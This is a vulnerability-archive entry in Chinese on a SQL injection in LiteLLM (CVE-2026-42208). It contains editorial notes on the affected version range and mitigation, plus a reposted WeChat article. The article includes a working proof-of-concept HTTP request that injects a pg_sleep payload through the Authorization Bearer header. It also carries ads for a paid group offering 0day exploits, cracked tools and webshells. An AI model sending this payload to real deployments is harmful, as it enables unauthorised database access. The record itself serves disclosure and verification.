---
cve: "CVE-2026-42208"
source: "gelusus/wxvl 公众号漏洞文库"
title: "AI大模型网关存在SQL注入漏洞、附 POC 复现、影响版本LiteLLM 1.81.16~1.83.7（CVE-2026-42208）"
product: "LiteLLM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2026-42208"
referenced_identifiers: ""
identifier_role: "primary"
affected_versions: "LiteLLM 1.81.16–1.83.7（原文声明；官方修复边界待核）"
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
id: "vw-6b6234276567e78a81f15a8f"
entity_id: "ve-6b6234276567e78a81f15a8f"
schema_version: "1"
---

# AI大模型网关存在SQL注入漏洞、附 POC 复现、影响版本LiteLLM 1.81.16~1.83.7（CVE-2026-42208）

## 2026-10-03 官方根因、版本与临时缓解补证

公开具体验证来源补充：[固定 Nuclei 模板](https://github.com/projectdiscovery/nuclei-templates/blob/9e93c63782dbb2b6160e068710d6240f418a3ed6/http/cves/2026/CVE-2026-42208.yaml)包含 UI/认证基线及 `POST /v1/chat/completions` 的构造 Authorization、`pg_sleep(8)` 请求，已静态阅读全文。实际有三条原始请求，不能依 max-request=2 元数据估算；请求会产生数据库延迟，可能耗尽资源。仅延迟达到八秒而缺少可靠对照仍不能独立判定成功；版本/指纹命中不是本漏洞证明。原模板字节不改写，其 SHA-256 为 `401f5a93c064e66521a244a702cbc41e1d2ded0aaa038700ba76ae5489d68e48`。


完整阅读 [LiteLLM 产品安全公告 GHSA-r75f-5x8p-qvmc](https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc)及 [CNA 记录](https://www.cve.org/CVERecord?id=CVE-2026-42208)后，影响区间应解释为 `>= 1.81.16, < 1.83.7`；1.83.7 是已修复版本，不能因原题的区间写法而包含进去。

输入是请求者提供的 API key，漏洞查询在代理鉴权的错误处理路径把该值拼进 SQL 文本；修复将其作为独立参数传入数据库。公告提供的临时缓解是在 `general_settings` 下设置 `disable_error_logs: true`，用于移除这条未认证输入到查询的路径，代价是减少错误日志，需结合审计需求评估。它不代表所有接口或其他漏洞都已修复，仍应升级。

本文的 `pg_sleep(15)` 报文会消耗数据库执行时间；只有延迟、500 或一次响应都不足以证明漏洞。归档没有完整时间对照或数据库证据，公告也未替它验证 `/v1/models` 的每种部署。保留原请求，不将它改写为无副作用检测。原文关于 Vercel/Cloudflare 已统一部署防护的说法不在这些一手来源中，不能据此认定迁移或开启某服务等同修复。本次没有请求目标或执行 SQL。


<!-- vulwiki-editorial:start -->
## 校订与适用边界

延时样例只能作为时间型 SQL 注入线索。至少需要同环境基线和不触发延时的对照，不能由单次慢请求推导任意数据库操作；云平台专项防护和迁移建议缺少本页可核验依据。


### 本次正文校订

- 原样保留空 Host；归档未记录测试主机，不猜测补占位符。
- 原样保留归档中的 Connection 请求头；重复字段的语义待核。
- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- SQL时间响应需基线/对照而非一次慢请求定漏洞
- 任意SQL操作断言超出给出延时证据
- Vercel/Cloudflare专属防护与迁移建议缺官方依据
- 缺修复版本和原始安全公告
- 广告与无关资源占多数

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

原创 漏洞复现Tony
                    漏洞复现Tony  渗透安全HackTwo   2026-05-03 02:45  
  
**0x01 简介**  
  
近期，开源大语言模型网关 LiteLLM 中发现了一个严重的 **SQL 注入漏洞**  
（CVE-2026-42208）。该漏洞存在于 **LiteLLM 1.81.16 到 1.83.7**  
 版本之间，这一版本广泛用于许多大语言模型的前端接口，如 **OpenAI**  
 和 **Anthropic**  
 等模型提供商。漏洞的发现和披露引起了网络安全界的高度关注，因为它允许未经授权的攻击者执行任意的 SQL 查询，获取敏感数据或对数据库进行恶意操作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAXcqibkQUobug3AWPjAKjbHOpPSlgmoj82azQrjCHsu0zAgV3fr75KQwfTOicZqoib4LhlNBhX70piaPkCdVYHpIRUu6huRfERdTPY/640?wx_fmt=png&from=appmsg "")  
  
**免责声明**  
> 请自行搭建环境进行漏洞测试，该公众号或作者星球分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
  
  
**TIPS: 更多POC**  
**末尾领取资料及加入星球福利**  
  
**0x02 漏洞详情**  
  
在 **LiteLLM 1.81.16 到 1.83.7**  
 版本中，漏洞的根本原因是**在执行 SQL 查询时直接使用了 HTTP 请求头中的 Authorization: Bearer 的值**  
，而没有对该值进行参数化处理或验证。这意味着，如果攻击者能够访问 LiteLLM 代理，他们便可以通过伪造请求头，绕过认证机制，向 PostgreSQL 后端数据库注入恶意的 SQL 查询语句。  
  
攻击者只需向任意 LLM API 路由发送特定构造的   
Authorization: Bearer  
 值，无需有效凭证，即可触发漏洞查询路径，影响数据库执行任意 SQL 操作。   
  
典型受影响的 API 路径包括：  
- POST /v1/chat/completions  
  
- POST /v1/embeddings  
  
- 其他需要检验 API key 的 endpoint  
  
**0x03 漏洞复现**  
  
Request Packet  
****  
```http
GET /v1/models HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer test' OR (SELECT 1 FROM (SELECT pg_sleep(15)) t) IS NOT NULL--
Connection: keep-alive
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXvLqZHjaMkMYCjYEAamtntcURrce2m4icNck3Qfk2LDAs57q1RXnic2dTcwPXO3yjtHTFUJ8YzM0gzQF4N64sHWW7rdiaD9icQUqA/640?wx_fmt=png&from=appmsg "")  
  
‍  
‍  
‍  
  
**0x04 修复建议**  
  
目前Vercel、Cloudflare等主流云服务平台已同步后台部署专属漏洞防护规则，未完成修复升级的业务可优先将LiteLLM网关业务迁移至已防护节点，或直接开启平台自带的AI应用安全防护、SQL注入专项防护模块，临时拦截恶意注入请求，阻断漏洞利用攻击链路，快速降低被攻击风险。  
  
###   
  
**内部星球VIP介绍V1.5（更多未公开挖洞技术欢迎加入星球）**  
  
  
**如果你想学习更多另类渗透SRC挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推，欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群🔥**  
  
🚀  
1.每周更新1day/0day漏洞刷分上分，目前已更新至5394+;  
  
🧰  
2.包含网上的各种付费工具/各种Burp  
漏洞检测插件  
/  
fuzz字典  
等等;  
  
🧩  
3.Fofa/  
Hunter  
/Ctfshow/  
360Quake  
/Shadon/零零信安/  
Zoomeye  
各种账号高级VIP会员共享等等;  
  
🎥  
4.最新SRC挖洞文库/红队/代审/免杀/逆向视频资源等等;  
  
🧪  
5.内部自动化漏扫赚赏金捡洞工具，免杀CS/Webshell工具等等;  
  
💡  
6.漏洞  
报告文库  
、  
共享SRC漏洞报告学习挖洞技巧；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAXlS5Ps3iaElYXHLB5ZaEDWKA9A5R904X9QL787kOicCVCnvVG4paibTtkWonIeXM1QW6PWKEXUCIsv4JcnpGoREHicibWibVu9bH70I/640?wx_fmt=png&from=appmsg "")  
  
🎯  
6.最新0Day1Day漏洞POC/EXP分享地址（同步更新）;  
  
https://t.zsxq.com/8IDY4  
(全网最新最完整的漏洞库)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVZmmFwC3xsticJNjPLiaBs7IROImYZKrBjqGxuz0sDaeHG37Td9gIiboSUCQcXWQkpDzlDgiblA7CFTyvNXGD5eiaTj6BN3GLnHMp0/640?wx_fmt=png&from=appmsg "")  
  
🔥  
7.详情直接点击下方链接进入了解，后台回复"   
星球  
 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！**点击下方地址全面了解👇🏻**  
  
  
**👉****点击了解加入-->>2026内部VIP星球福利介绍V1.5版本-1day/0day漏洞库及内部资源更新**  
  
  
**结尾**  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**  
" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“**书籍**  
" 获取 网络安全相关经典书籍电子版pdf  
  
压缩包解压密码：HackTwo  
  
  
  
# 免责声明  
  
  
        
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**内部VIP知识星球福利介绍V1.5版本**  
  
**最新BurpSuite2026.4.1专业版中英文版下载**  
  
**最新Nessus2026下载Windows/Linux**  
  
**最新xray1.9.11高级版下载Windows/Linux**  
  
**最新HCL AppScan Standard 10.9.128273破解版下载**  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
